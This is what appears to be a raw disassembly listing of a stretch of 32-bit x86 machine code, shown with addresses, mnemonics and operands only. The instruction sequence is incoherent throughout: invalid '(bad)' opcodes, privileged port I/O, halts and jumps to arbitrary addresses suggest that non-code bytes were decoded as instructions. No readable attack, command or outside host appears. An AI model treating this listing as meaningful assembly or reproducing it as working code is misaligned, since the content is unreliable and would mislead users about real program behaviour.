  412daf:	xchg   DWORD PTR [eax],ebp
  412db1:	xor    bh,BYTE PTR [ebp-0x264abd69]
  412db7:	pusha  
  412db8:	fmulp  st(6),st
  412dba:	push   edi
  412dbb:	pop    ecx
  412dbc:	(bad)  
  412dbd:	cmp    dl,BYTE PTR [esi+0x52e464b0]
  412dc3:	cmp    DWORD PTR [eax-0x2c1571e1],eax
  412dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dca:	aad    0x4e
  412dcc:	ficomp DWORD PTR [ebx+eax*4+0x66]
  412dd0:	repz iret 
  412dd2:	jo     0x412e2c
  412dd4:	data16 daa 
  412dd6:	pop    edx
  412dd7:	out    dx,eax
  412dd8:	inc    ecx
  412dd9:	ret    0x5bed
  412ddc:	jg     0x412e25
  412dde:	pop    ecx
  412ddf:	fistp  WORD PTR [ebx]
  412de1:	imul   esp,DWORD PTR [edx],0x5bac55e7
  412de7:	outs   dx,DWORD PTR ds:[esi]
  412de8:	jae    0x412e33
  412dea:	hlt    
  412deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dec:	ret    0x7439
  412def:	push   esp
  412df0:	outs   dx,BYTE PTR ds:[esi]
  412df1:	inc    esp
  412df2:	jmp    0x412dac
  412df4:	cwde   
  412df5:	pusha  
  412df6:	sub    dh,BYTE PTR [edx-0xc03f498]
  412dfc:	mov    ebx,0xa5cec58b
  412e01:	inc    esi
  412e02:	mov    bl,0x39
  412e04:	loop   0x412dfe
  412e06:	inc    ecx
  412e07:	inc    BYTE PTR [ebp+0x3e]
  412e0a:	sti    
  412e0b:	dec    ebp
  412e0c:	add    eax,0x2bf7c681
  412e11:	nop
  412e12:	push   ds
  412e13:	lods   al,BYTE PTR ds:[esi]
  412e14:	mov    cl,0xd1
  412e16:	dec    ebx
  412e17:	or     ah,BYTE PTR [esi-0x1677e5fa]
  412e1d:	lock aaa 
  412e1f:	scas   al,BYTE PTR es:[edi]
  412e20:	je     0x412e62
  412e22:	std    
  412e23:	bound  ebp,QWORD PTR [edx+ebp*4]
  412e26:	push   ecx
  412e27:	jmp    0x7bbc744d
  412e2c:	jo     0x412dba
  412e2e:	je     0x412db6
  412e30:	sbb    ch,BYTE PTR [eax+eiz*8+0x750bad8b]
  412e37:	test   DWORD PTR [esi],ecx
  412e39:	lahf   
  412e3a:	(bad)  
  412e3b:	or     al,0xc
  412e3d:	mov    al,0x78
  412e3f:	xor    ebx,DWORD PTR ds:0xfb9cd988
  412e45:	leave  
  412e46:	pop    ecx
  412e47:	inc    ebx
  412e48:	pop    ss
  412e49:	ins    BYTE PTR es:[edi],dx
  412e4a:	std    
  412e4b:	mov    eax,0x4fe5b63b
  412e50:	mov    ch,0x15
  412e52:	loope  0x412e95
  412e54:	add    DWORD PTR [ebx+0x2bbe8f7b],edx
  412e5a:	adc    ecx,DWORD PTR [esi-0x10]
  412e5d:	jp     0x412ed4
  412e5f:	(bad)  
  412e60:	jmp    0x412e5d
  412e62:	and    DWORD PTR [edi],ecx
  412e64:	sbb    al,0x70
  412e66:	int3   
  412e67:	pop    esi
  412e68:	inc    BYTE PTR [ebp+0x2b]
  412e6b:	and    al,0xea
  412e6d:	push   edi
  412e6e:	add    ah,BYTE PTR [ecx-0x7]
  412e71:	add    BYTE PTR [esi-0x7bbb19de],ah
  412e77:	scas   al,BYTE PTR es:[edi]
  412e78:	or     BYTE PTR [ebp-0x2c],bh
  412e7b:	mov    eax,0x5068f2ea
  412e80:	push   edi
  412e81:	mov    al,al
  412e83:	cmp    ebp,edx
  412e85:	int3   
  412e86:	mov    ah,0x6e
  412e88:	test   ecx,edi
  412e8a:	(bad)  
  412e8b:	out    dx,eax
  412e8c:	retf   0xc3ea
  412e8f:	sti    
  412e90:	cmp    BYTE PTR [esi+edi*4],ch
  412e93:	ds dec edi
  412e95:	mov    bh,0xbf
  412e97:	call   0x98aa:0x6ffb9f32
  412e9e:	mov    edi,DWORD PTR [ebp+eax*8+0x51ffde10]
  412ea5:	or     al,0x7b
  412ea7:	std    
  412ea8:	nop
  412ea9:	push   edx
  412eaa:	stc    
  412eab:	bound  edi,QWORD PTR [edx+0x6266759f]
  412eb1:	in     eax,dx
  412eb2:	fild   WORD PTR ds:0x59a05af2
  412eb8:	std    
  412eb9:	fs ins DWORD PTR es:[edi],dx
  412ebb:	sbb    bh,cl
  412ebd:	ror    dl,cl
  412ebf:	mov    ds:0x1f9379f3,al
  412ec4:	jmp    FWORD PTR [eax+0x32]
  412ec7:	pop    eax
  412ec8:	push   esi
  412ec9:	nop
  412eca:	cmc    
  412ecb:	xor    DWORD PTR [ecx],ebx
  412ecd:	cmp    dl,al
  412ecf:	iret   
  412ed0:	adc    al,0xa5
  412ed2:	mov    edx,0xfd17a481
  412ed7:	or     DWORD PTR [edx-0xb],esi
  412eda:	mov    bl,0x38
  412edc:	int    0x6b
  412ede:	or     bh,ch
  412ee0:	sti    
  412ee1:	push   ds
  412ee2:	lods   eax,DWORD PTR cs:[esi]
  412ee4:	int3   
  412ee5:	sahf   
  412ee6:	sbb    eax,0xcc9fee27
  412eeb:	bound  ecx,QWORD PTR [esi]
  412eed:	ins    DWORD PTR es:[edi],dx
  412eee:	pop    ebx
  412eef:	fcomp  DWORD PTR [edx-0x24]
  412ef2:	pop    ss
  412ef3:	mov    eax,ds:0xaf35f20e
  412ef8:	sbb    DWORD PTR ss:[ebx-0x4],esp
  412efc:	test   BYTE PTR [edx-0x77],bl
  412eff:	xchg   bh,bl
  412f01:	(bad)  
  412f02:	data16 stc 
  412f04:	popa   
  412f05:	pop    esi
  412f06:	cmp    al,0x28
  412f08:	pop    edi
  412f09:	push   ecx
  412f0a:	jo     0x412e8e
  412f0c:	mov    ecx,0x9835135d
  412f11:	pop    ds
  412f12:	dec    edi
  412f13:	outs   dx,DWORD PTR ds:[esi]
  412f14:	loopne 0x412ea5
  412f16:	pop    ds
  412f17:	outs   dx,DWORD PTR ds:[esi]
  412f18:	std    
  412f19:	pop    esp
  412f1a:	adc    eax,0xcc8d32de
  412f1f:	jb     0x412f3a
  412f21:	mov    ds:0x7fa229f3,al
  412f26:	mov    esi,DWORD PTR [ebx+ebp*4+0x31]
  412f2a:	mov    ecx,0x8148e487
  412f2f:	pop    ecx
  412f30:	push   ebx
  412f31:	xchg   esi,eax
  412f32:	or     edx,edi
  412f34:	mov    BYTE PTR [ebx],dh
  412f36:	xchg   esi,eax
  412f37:	call   FWORD PTR [ebp+0x3d]
  412f3a:	mov    ah,0x8e
  412f3c:	mov    al,ds:0x9140975
  412f41:	mov    al,0xf5
  412f43:	mov    ah,0xb7
  412f45:	ret    0x9d99
  412f48:	mov    dh,0x2a
  412f4a:	pop    ecx
  412f4b:	dec    edx
  412f4c:	pop    ds
  412f4d:	jl     0x412f26
  412f4f:	sub    eax,DWORD PTR ds:0x58dee02d
  412f55:	int3   
  412f56:	loopne 0x412f96
  412f58:	sbb    al,0x57
  412f5a:	inc    edi
  412f5b:	fnstenv [ecx-0x38f2085a]
  412f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f62:	aaa    
  412f63:	fcmovnbe st,st(6)
  412f65:	mov    ebx,edx
  412f67:	lea    edi,[edx-0x38cada64]
  412f6d:	aam    0x4c
  412f6f:	out    dx,al
  412f70:	stos   DWORD PTR es:[edi],eax
  412f71:	clc    
  412f72:	push   0x43
  412f74:	sbb    esi,DWORD PTR ds:0xdb9ccb5b
  412f7a:	xor    BYTE PTR [ecx+0x4],dh
  412f7d:	(bad)  
  412f7e:	push   edx
  412f7f:	dec    esp
  412f80:	mov    ds:0x84c614e8,al
  412f85:	sbb    al,0x3c
  412f87:	out    dx,al
  412f88:	neg    bl
  412f8a:	and    al,0x59
  412f8c:	mov    edi,0xd6cb7e07
  412f91:	nop
  412f92:	mov    edx,0x38aee7d1
  412f97:	pop    ebx
  412f98:	push   0x1d
  412f9a:	mov    ds:0xe0ece7b5,al
  412f9f:	and    al,dh
  412fa1:	cmp    ch,BYTE PTR [edx-0x66e83f8d]
  412fa7:	adc    dh,BYTE PTR [ebx+0x72]
  412faa:	ret    
  412fab:	push   cs
  412fac:	push   DWORD PTR [ecx+0x4014fe79]
  412fb2:	mov    cl,0x8f
  412fb4:	jno    0x413022
  412fb6:	int3   
  412fb7:	pop    ebx
  412fb8:	out    dx,al
  412fb9:	xchg   ebx,eax
  412fba:	in     eax,dx
  412fbb:	xchg   DWORD PTR [ecx-0x5b85eb81],edi
  412fc1:	mov    eax,ds:0x10a2af0a
  412fc6:	jge    0x41301e
  412fc8:	rcl    DWORD PTR [esi+0x69],0xce
  412fcc:	inc    esp
  412fcd:	and    DWORD PTR [esi+esi*4-0x6b35a0c1],esp
  412fd4:	or     BYTE PTR [ecx+0x32],dh
  412fd7:	fwait
  412fd8:	xchg   edx,eax
  412fd9:	div    BYTE PTR [ebx]
  412fdb:	aas    
  412fdc:	or     dl,bh
  412fde:	shl    BYTE PTR [ebp-0x28],1
  412fe1:	and    BYTE PTR [edi],0xe2
  412fe4:	ret    0x94e5
  412fe7:	mov    eax,0xd94d00c3
  412fec:	and    DWORD PTR [ecx],edx
  412fee:	iret   
  412fef:	or     eax,0x74821a51
  412ff4:	lea    ebp,[edi]
  412ff6:	in     al,0x69
  412ff8:	sbb    ecx,edx
  412ffa:	pop    esp
  412ffb:	push   ds
  412ffc:	dec    ecx
  412ffd:	or     al,0xed
  412fff:	arpl   WORD PTR [eax-0x2184f1c9],bx
  413005:	outs   dx,BYTE PTR fs:[esi]
  413007:	lahf   
  413008:	dec    ecx
  413009:	xor    eax,0x1209b8b4
  41300e:	(bad)  
  41300f:	cmp    al,0xbb
  413011:	enter  0xbede,0xc7
  413015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413016:	xchg   bl,al
  413018:	aas    
  413019:	cwde   
  41301a:	sahf   
  41301b:	pusha  
  41301c:	jbe    0x41303e
  41301e:	sahf   
  41301f:	mov    bl,0xf
  413021:	ins    BYTE PTR es:[edi],dx
  413022:	aad    0x86
  413024:	das    
  413025:	cmp    esp,DWORD PTR [esi]
  413027:	cmp    BYTE PTR [esi],bh
  413029:	pop    edi
  41302a:	xchg   edi,eax
  41302b:	inc    edx
  41302c:	pop    DWORD PTR [ecx-0x55700f48]
  413032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413033:	bnd jg 0x413086
  413036:	loop   0x412fe8
  413038:	lahf   
  413039:	lods   al,BYTE PTR ds:[esi]
  41303a:	in     al,dx
  41303b:	dec    esi
  41303c:	add    ebp,ecx
  41303e:	rcr    DWORD PTR [ecx*4+0x30d97434],1
  413045:	push   ebp
  413046:	addr16 cld 
  413048:	out    dx,al
  413049:	shr    DWORD PTR [ebx+0x53],1
  41304c:	enter  0xae3c,0xf0
  413050:	adc    ah,BYTE PTR [edi-0x75]
  413053:	pusha  
  413054:	fdivp  st(2),st
  413056:	jns    0x412fe9
  413058:	lahf   
  413059:	mov    ds:0xf06ea19c,eax
  41305e:	xor    BYTE PTR [edi+ebp*2],0x2c
  413062:	mov    ah,0xd7
  413064:	mov    ecx,0xf0cb172d
  413069:	mov    al,ds:0x3922de8b
  41306e:	jbe    0x413024
  413070:	mov    ebx,DWORD PTR [ebx+edi*4-0x1087ce50]
  413077:	mov    ds:0x7b83df06,al
  41307c:	aaa    
  41307d:	push   eax
  41307e:	out    dx,al
  41307f:	clc    
  413080:	xor    BYTE PTR [esp+ebx*4+0x4c],ch
  413084:	test   BYTE PTR [edx+eax*2],bl
  413087:	nop
  413088:	std    
  413089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41308a:	sbb    dl,0xa2
  41308d:	or     esi,DWORD PTR [ecx+0x4b]
  413090:	and    al,BYTE PTR [esi+0x31]
  413093:	daa    
  413094:	js     0x413022
  413096:	cmp    DWORD PTR [edx+0x2a],edx
  413099:	addr16 push edi
  41309b:	inc    esp
  41309c:	fiadd  DWORD PTR [esp+edx*4+0x5f]
  4130a0:	dec    esi
  4130a1:	xchg   ecx,eax
  4130a3:	scas   eax,DWORD PTR es:[edi]
  4130a4:	sub    al,0xd
  4130a6:	xor    al,0x21
  4130a8:	scas   al,BYTE PTR es:[edi]
  4130a9:	mov    ecx,0x66bb38b6
  4130ae:	cmp    al,0x1e
  4130b0:	pop    esi
  4130b1:	std    
  4130b2:	popf   
  4130b3:	dec    ebx
  4130b4:	or     eax,0x2b8c137a
  4130b9:	cwde   
  4130ba:	jmp    0x413115
  4130bc:	cmp    al,0x97
  4130be:	pusha  
  4130bf:	dec    esp
  4130c0:	in     al,dx
  4130c1:	pop    ebp
  4130c2:	xor    BYTE PTR [esi],bh
  4130c4:	jmp    0x413058
  4130c6:	cwde   
  4130c7:	add    al,0xf1
  4130c9:	push   ds
  4130ca:	cmp    al,0x16
  4130cc:	loop   0x413071
  4130ce:	aas    
  4130cf:	push   eax
  4130d0:	xor    DWORD PTR [edx-0x13],ebx
  4130d3:	pop    edx
  4130d4:	adc    DWORD PTR [esi+0x618650ee],esp
  4130da:	sbb    dl,BYTE PTR [esi]
  4130dc:	mov    cl,0x1f
  4130de:	sub    BYTE PTR [edi+0x6f],0x79
  4130e2:	push   esi
  4130e3:	fxch   st(1)
  4130e5:	pushf  
  4130e6:	inc    eax
  4130e7:	loop   0x41306f
  4130e9:	shl    DWORD PTR [eax-0x6],cl
  4130ec:	(bad)  
  4130ed:	or     ebp,DWORD PTR [ebx+0xd1dfbc7]
  4130f3:	push   es
  4130f4:	test   eax,0x55cdb45e
  4130f9:	je     0x4130ff
  4130fb:	sbb    eax,0xa7e47f4e
  413100:	sbb    al,0x3c
  413102:	rcl    edx,0xe8
  413105:	fmul   DWORD PTR [esp+edx*2+0x2b]
  413109:	daa    
  41310a:	pop    ds
  41310b:	test   eax,0x6f94ba9c
  413110:	outs   dx,DWORD PTR ds:[esi]
  413111:	push   esp
  413112:	and    bl,ah
  413114:	out    dx,eax
  413115:	add    DWORD PTR [edx-0x582e384c],esp
  41311b:	cmc    
  41311c:	fxam   
  41311e:	xchg   ebp,eax
  41311f:	jle    0x4130ef
  413121:	out    dx,eax
  413122:	cs fdivr st,st(7)
  413125:	fadd   st(3),st
  413127:	xchg   ebp,esp
  413129:	stos   DWORD PTR es:[edi],eax
  41312a:	neg    dl
  41312c:	icebp  
  41312d:	ret    
  41312e:	xchg   ebp,eax
  41312f:	dec    edx
  413130:	xor    bh,BYTE PTR [ecx]
  413132:	dec    ecx
  413133:	pop    eax
  413134:	in     al,dx
  413135:	adc    DWORD PTR [edx],eax
  413137:	add    cl,BYTE PTR [eax-0x38]
  41313a:	sbb    DWORD PTR [ebp+0x52],eax
  41313d:	dec    esp
  41313e:	push   esp
  41313f:	sbb    DWORD PTR [edi+0x62],0x47
  413143:	repnz xchg ebx,eax
  413145:	scas   al,BYTE PTR es:[edi]
  413146:	(bad)  
  413147:	pop    ss
  413148:	push   0x6fb313eb
  41314d:	icebp  
  41314e:	hlt    
  41314f:	aas    
  413150:	xor    eax,0x7f54bf83
  413155:	out    0x2c,eax
  413157:	and    al,0x62
  413159:	ret    
  41315a:	lods   eax,DWORD PTR ds:[esi]
  41315b:	fnsave [ebx]
  41315d:	stos   BYTE PTR es:[edi],al
  41315e:	aas    
  41315f:	cmp    bl,BYTE PTR [ebx-0x302b4884]
  413165:	imul   edi,edi,0xffffff9e
  413168:	scas   al,BYTE PTR es:[edi]
  413169:	mov    eax,0x14cef09c
  41316e:	pop    ebx
  41316f:	pusha  
  413170:	sahf   
  413171:	pop    es
  413172:	mov    esi,0xfb2bb375
  413177:	lds    edx,FWORD PTR [ebp+0x5170ed68]
  41317d:	jne    0x4131e3
  41317f:	jne    0x41311e
  413181:	xor    eax,0xadf0163b
  413186:	gs test eax,0x651b4058
  41318c:	aas    
  41318d:	jno    0x413143
  41318f:	stos   DWORD PTR es:[edi],eax
  413190:	and    BYTE PTR [ecx+ebp*8+0x3b],0x6c
  413195:	pusha  
  413196:	in     eax,dx
  413197:	ret    
  413198:	arpl   WORD PTR [esp+ebx*8],sp
  41319b:	jge    0x41320c
  41319d:	pop    ss
  41319e:	outs   dx,DWORD PTR ds:[esi]
  41319f:	ret    
  4131a0:	cmp    dl,BYTE PTR [edx-0x2d]
  4131a3:	test   DWORD PTR ds:0x4cedae7d,edx
  4131a9:	call   0x4e005860
  4131ae:	xchg   ecx,eax
  4131af:	xlat   BYTE PTR ds:[ebx]
  4131b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131b1:	and    DWORD PTR ds:[eax-0x7f0852f3],0x36f898a2
  4131bc:	ror    BYTE PTR ds:0x2d74f6c0,cl
  4131c2:	push   cs
  4131c3:	fisubr WORD PTR [ebx]
  4131c5:	js     0x4131e0
  4131c7:	inc    ecx
  4131c8:	into   
  4131c9:	xlat   BYTE PTR ds:[ebx]
  4131ca:	or     DWORD PTR [bx+si+0x69d3],ecx
  4131cf:	pcmpgtb mm4,mm7
  4131d2:	adc    ecx,DWORD PTR [edi-0x69]
  4131d5:	push   ecx
  4131d6:	push   ds
  4131d7:	push   ebx
  4131d8:	inc    edx
  4131d9:	lods   al,BYTE PTR ds:[esi]
  4131da:	pop    esi
  4131db:	(bad)  
  4131dc:	push   esi
  4131dd:	xlat   BYTE PTR ds:[ebx]
  4131de:	mov    esi,0x7d2939c8
  4131e3:	fimul  DWORD PTR [ecx+0x45db2ab7]
  4131e9:	push   esi
  4131ea:	push   0x9c89e74c
  4131ef:	aad    0x8a
  4131f1:	jp     0x41321e
  4131f3:	xchg   esp,eax
  4131f4:	rcr    DWORD PTR [eax+ebx*8],0xb7
  4131f8:	mov    ecx,0x5769d6ad
  4131fd:	in     al,dx
  4131fe:	mulps  xmm0,XMMWORD PTR ds:0x278f32ff
  413205:	pop    esi
  413206:	(bad)  
  413208:	loop   0x4131b3
  41320a:	dec    esp
  41320b:	or     ch,BYTE PTR [ebx]
  41320d:	fucom  st(1)
  41320f:	test   eax,0x71776cf7
  413214:	cmp    al,0x7b
  413216:	fcom   QWORD PTR [eax-0x42]
  413219:	jno    0x41320c
  41321b:	fbstp  TBYTE PTR [esi]
  41321d:	xchg   esi,eax
  41321e:	(bad)  
  41321f:	or     ecx,esp
  413221:	and    BYTE PTR [edi],0x72
  413224:	fldenv [ebp+ebp*1-0x5b]
  413228:	mov    DWORD PTR [edx+0x6b],eax
  41322b:	ror    bl,1
  41322d:	loop   0x413255
  41322f:	hlt    
  413230:	push   ebp
  413231:	ds retf 
  413233:	ret    
  413234:	pop    esp
  413235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413236:	jb     0x41321a
  413238:	test   al,0xcf
  41323a:	lods   al,BYTE PTR ds:[esi]
  41323b:	push   ebp
  41323c:	jns    0x413251
  41323e:	clc    
  41323f:	mov    al,ds:0x9dcc215f
  413244:	repnz mov ecx,0x8400e628
  41324a:	mov    esi,0xa395f509
  41324f:	call   DWORD PTR [ebx-0x63cf29d6]
  413255:	rcr    DWORD PTR [esi-0x4f],cl
  413258:	sbb    al,0x2f
  41325a:	pop    ebx
  41325b:	pop    esi
  41325c:	gs mov esi,0xadcf0bcd
  413262:	das    
  413263:	adc    BYTE PTR [edi-0x48],dl
  413266:	xor    eax,0xb0a875b4
  41326b:	test   al,0xb3
  41326d:	mov    esp,0x1fb6d658
  413272:	pop    eax
  413273:	sbb    BYTE PTR [esi],dl
  413275:	mov    DWORD PTR [edx+0x6f07be70],ebx
  41327b:	cmc    
  41327c:	pop    ebp
  41327d:	retf   0xcd99
  413280:	add    al,0x1d
  413282:	jbe    0x413226
  413284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413285:	ret    
  413286:	add    esp,DWORD PTR [edx]
  413288:	mov    ds:0xe2998a8c,al
  41328d:	addr16 mov ch,0x9e
  413290:	or     ebx,DWORD PTR [ebx]
  413292:	and    eax,0xe6c816d1
  413297:	xor    BYTE PTR [edx+edx*2+0x2a],ah
  41329b:	psubsw mm5,QWORD PTR [ebp-0x48]
  41329f:	popf   
  4132a0:	add    esp,0x3d
  4132a3:	add    DWORD PTR [ebx],0x63
  4132a6:	jge    0x413283
  4132a8:	in     al,0x95
  4132aa:	sub    cl,BYTE PTR [ebp-0x19]
  4132ad:	adc    eax,0x332e05d2
  4132b2:	into   
  4132b3:	sti    
  4132b4:	clc    
  4132b5:	xor    al,BYTE PTR ds:0xfa021ccc
  4132bb:	fidivr DWORD PTR [ebx+0x58]
  4132be:	sbb    ch,BYTE PTR [edx+ebp*4-0x72]
  4132c2:	lds    esi,FWORD PTR [ecx-0x6c7f9b92]
  4132c8:	sar    DWORD PTR [ebp-0x5a],1
  4132cb:	push   0xffffffa3
  4132cd:	adc    ah,0x3c
  4132d0:	add    edx,DWORD PTR [edx+0x2b6de00e]
  4132d6:	dec    ebp
  4132d7:	inc    esi
  4132d8:	dec    ebp
  4132d9:	lea    esi,[eax]
  4132db:	test   BYTE PTR [edi+0x1d10d000],cl
  4132e1:	add    eax,0x601c2022
  4132e6:	xchg   DWORD PTR [edx+0x55],eax
  4132e9:	aad    0xf8
  4132eb:	icebp  
  4132ec:	pop    ebx
  4132ed:	int    0xa6
  4132ef:	sar    BYTE PTR ds:0x577d53a4,1
  4132f5:	cmp    dh,BYTE PTR [ecx]
  4132f7:	jne    0x413289
  4132f9:	cld    
  4132fa:	mov    ebp,0x7b0a8f30
  4132ff:	imul   esi,DWORD PTR [edi],0x22
  413302:	outs   dx,DWORD PTR ds:[esi]
  413303:	sbb    bh,BYTE PTR ds:0x95015f54
  413309:	pushf  
  41330a:	inc    edx
  41330b:	lds    esp,FWORD PTR [ebp-0x6fd4d382]
  413311:	add    ebx,DWORD PTR [esi]
  413313:	cwde   
  413314:	mov    esp,0xf04d4e0c
  413319:	cmp    BYTE PTR [edx],ah
  41331b:	mov    ah,0xd4
  41331d:	das    
  41331e:	int3   
  41331f:	xchg   edx,eax
  413320:	sbb    al,0x21
  413323:	mov    dl,0x1c
  413325:	sbb    ebx,esp
  413327:	jne    0x413365
  413329:	fs js  0x41335e
  41332c:	or     ecx,ecx
  41332e:	loope  0x413365
  413330:	sbb    eax,0x3ecd3666
  413335:	lahf   
  413336:	xchg   edx,eax
  413337:	sub    DWORD PTR ds:0xd5417640,ecx
  41333d:	inc    ebx
  41333e:	inc    edx
  41333f:	add    eax,0x689b4896
  413344:	sub    eax,0x15ca6a3c
  413349:	fwait
  41334a:	add    al,0xed
  41334c:	xchg   edi,eax
  41334d:	loopne 0x4132f5
  41334f:	stos   DWORD PTR es:[edi],eax
  413350:	hlt    
  413351:	rcr    BYTE PTR [edi],0x73
  413354:	mov    ch,0xab
  413356:	out    0x72,al
  413358:	inc    ecx
  413359:	(bad)  
  41335a:	aas    
  41335b:	(bad)  
  41335c:	in     eax,dx
  41335d:	and    DWORD PTR [edi+0x2e0035d8],esp
  413363:	seta   BYTE PTR [eax]
  413366:	adc    DWORD PTR [ebp+0x71717807],0x97e8f66c
  413370:	out    0xd6,eax
  413372:	das    
  413373:	sbb    ebp,DWORD PTR [esi]
  413375:	push   esp
  413376:	imul   ebp,esp,0x9113997a
  41337c:	fdivr  QWORD PTR [eax-0x3]
  41337f:	jp     0x413301
  413381:	cmc    
  413382:	xchg   DWORD PTR ds:0x50759d8b,ebp
  413388:	or     eax,0xfccd93cb
  41338d:	jge    0x4133c4
  41338f:	int    0x73
  413391:	mov    bl,0x8a
  413393:	(bad)  
  413395:	and    al,BYTE PTR [edi+0x79]
  413398:	inc    edi
  413399:	pop    esp
  41339a:	stos   DWORD PTR es:[edi],eax
  41339b:	js     0x4133c7
  41339d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41339e:	jo     0x413365
  4133a0:	pop    ss
  4133a1:	and    DWORD PTR [ebx-0x6e5cbf71],ebp
  4133a7:	loope  0x413404
  4133a9:	sbb    al,0x90
  4133ab:	leave  
  4133ac:	mov    ebx,0xa90a8121
  4133b1:	xchg   ebx,eax
  4133b2:	test   al,0xd5
  4133b4:	mov    WORD PTR ds:0xadba3343,fs
  4133ba:	pushf  
  4133bb:	popf   
  4133bc:	(bad)  
  4133bd:	cmc    
  4133be:	or     BYTE PTR [esp-0xe],0xb9
  4133c3:	mov    ah,0x53
  4133c5:	add    esi,DWORD PTR [esi-0x47]
  4133c8:	mov    esp,0xeb03026e
  4133cd:	les    esp,FWORD PTR [esi+eiz*4-0x6a591fd0]
  4133d4:	mov    esp,0x60382512
  4133d9:	dec    edx
  4133da:	sbb    DWORD PTR [esp+eiz*4],eax
  4133dd:	cmp    eax,0x8759a37c
  4133e2:	test   al,0xcf
  4133e4:	mov    ch,0x8c
  4133e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133e7:	cmp    dh,BYTE PTR [edi+edi*2]
  4133ea:	iret   
  4133eb:	add    esp,0xba1648cc
  4133f1:	call   0xd2d79821
  4133f6:	iret   
  4133f7:	mov    eax,ds:0x7847111a
  4133fc:	inc    esi
  4133fd:	push   ecx
  4133fe:	adc    edi,DWORD PTR [esp+ebp*2-0x25]
  413402:	mov    ds:0x153790ff,eax
  413407:	push   eax
  413408:	in     al,0xad
  41340a:	popa   
  41340b:	dec    BYTE PTR [ecx]
  41340d:	inc    eax
  41340e:	stos   DWORD PTR es:[edi],eax
  41340f:	stos   DWORD PTR es:[edi],eax
  413410:	adc    ch,BYTE PTR [ebp-0x32befd33]
  413416:	dec    edi
  413417:	(bad)  
  413419:	test   eax,0xc42fa6bd
  41341e:	dec    edx
  41341f:	or     al,dl
  413421:	ins    BYTE PTR es:[edi],dx
  413422:	xor    DWORD PTR [esi+0x66],esp
  413425:	mov    WORD PTR [edi-0x4e],ss
  413428:	and    al,BYTE PTR [edi-0x5f432f0f]
  41342e:	inc    eax
  41342f:	lahf   
  413430:	in     al,dx
  413431:	jmp    0x1677:0x8b21a785
  413438:	xchg   ecx,eax
  413439:	dec    ebx
  41343b:	xlat   BYTE PTR ds:[ebx]
  41343c:	mov    al,0x73
  41343e:	imul   edx,DWORD PTR [esi+0xb],0xd30abacb
  413445:	and    bl,BYTE PTR [ebp+0x53]
  413448:	and    ebp,esp
  41344a:	mov    eax,ds:0x6b3a5282
  41344f:	mov    ebp,0xb86734ad
  413454:	push   ebp
  413455:	in     al,0x85
  413457:	jmp    0x4133d9
  413459:	test   BYTE PTR [edx*2-0x14f5b170],dl
  413460:	and    eax,0x6811995d
  413465:	out    dx,eax
  413466:	xchg   edi,eax
  413467:	ins    BYTE PTR es:[edi],dx
  413468:	in     eax,dx
  413469:	dec    esi
  41346a:	add    bl,0x4e
  41346d:	xchg   esp,eax
  41346e:	stos   BYTE PTR es:[edi],al
  41346f:	jae    0x41347a
  413471:	pop    ss
  413472:	mov    esi,0xa4b33fe4
  413477:	hlt    
  413478:	jecxz  0x4134a7
  41347a:	fild   WORD PTR [edi+0x142bf840]
  413480:	sbb    DWORD PTR [ecx-0x72],ecx
  413483:	loopne 0x4134bc
  413485:	push   es
  413486:	nop
  413487:	jb     0x4134fd
  413489:	popf   
  41348a:	inc    esp
  41348b:	dec    esp
  41348c:	outs   dx,BYTE PTR ds:[esi]
  41348d:	adc    BYTE PTR [edx],bl
  41348f:	and    BYTE PTR [ecx-0x68],bl
  413492:	cmp    DWORD PTR [ebp+edi*4-0x4b218adf],edi
  413499:	mov    al,0xf5
  41349b:	mov    al,0x33
  41349d:	jecxz  0x41350f
  41349f:	inc    ecx
  4134a0:	pop    edx
  4134a1:	mov    DWORD PTR [edi+0x6364695c],ecx
  4134a7:	retf   0x276a
  4134aa:	dec    ax
  4134ac:	(bad)  
  4134ae:	in     al,0x77
  4134b0:	xchg   ebx,eax
  4134b1:	jb     0x413485
  4134b3:	mov    es,WORD PTR [ecx-0x37b89df4]
  4134b9:	dec    DWORD PTR [eax]
  4134bb:	push   0xfffffff6
  4134bd:	jns    0x41346b
  4134bf:	scas   al,BYTE PTR es:[edi]
  4134c0:	cmp    ebp,DWORD PTR [edi+0x66c9986e]
  4134c6:	rcl    BYTE PTR [eax-0x17],0xa4
  4134ca:	adc    cl,bl
  4134cc:	mov    al,ds:0xea7cf4f4
  4134d1:	add    DWORD PTR [edi-0xf522b95],ebp
  4134d7:	add    DWORD PTR [eax],ecx
  4134d9:	lds    ebp,FWORD PTR [edi+0x7b]
  4134dc:	mov    bl,0x9d
  4134de:	daa    
  4134df:	out    0xe6,al
  4134e1:	xchg   edi,eax
  4134e2:	pop    ss
  4134e3:	add    eax,0x68c24201
  4134e8:	inc    edi
  4134e9:	mov    dh,0xbd
  4134eb:	in     eax,dx
  4134ec:	mov    esp,0x90a23fe5
  4134f1:	out    dx,al
  4134f2:	sub    eax,0xc5651d24
  4134f7:	stc    
  4134f8:	scas   eax,DWORD PTR es:[edi]
  4134f9:	ds cmc 
  4134fb:	popa   
  4134fc:	outs   dx,DWORD PTR ds:[esi]
  4134fd:	jge    0x4134bc
  4134ff:	pusha  
  413500:	sbb    eax,0xd7c281a7
  413505:	retf   0xd806
  413508:	call   0xa8872e9a
  41350d:	test   al,0xb6
  41350f:	into   
  413510:	outs   dx,BYTE PTR ds:[esi]
  413511:	icebp  
  413512:	loopne 0x4134d5
  413514:	push   cs
  413515:	or     ebp,DWORD PTR [eax+edi*2]
  413518:	sub    eax,DWORD PTR [edx+0x4e5c0558]
  41351e:	sbb    ebp,DWORD PTR [ebx-0x4ecc3ee2]
  413524:	push   ds
  413525:	mov    al,0x1b
  413527:	xor    bh,0xa4
  41352a:	mov    al,ds:0xbf494028
  41352f:	and    al,0xe3
  413531:	mov    fs,WORD PTR [eax+0x6ee4c959]
  413537:	sar    DWORD PTR [ebp+0x65],0x2b
